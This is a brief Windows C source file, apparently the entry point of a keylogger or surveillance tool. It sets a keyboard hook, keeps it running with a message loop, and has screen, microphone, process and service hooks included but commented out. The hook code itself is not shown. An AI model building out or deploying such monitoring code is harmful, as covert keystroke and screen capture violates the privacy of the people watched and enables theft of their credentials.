#include <stdio.h>
#include <windows.h>

#include "hooks/keyboard.h"
#include "hooks/screen.h"
#include "hooks/microphone.h"
#include "hooks/processes.h"
#include "hooks/services.h"

int main() {
    // Set hooks
    SetKeyboardHook();
    //SetScreenHook();
    //SetMicrophoneHook();
    //SetProcessesHook();
    //SetServicesHook();

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Remove the hooks when done
    RemoveKeyboardHook();
    //RemoveScreenHook();
    return 0;
}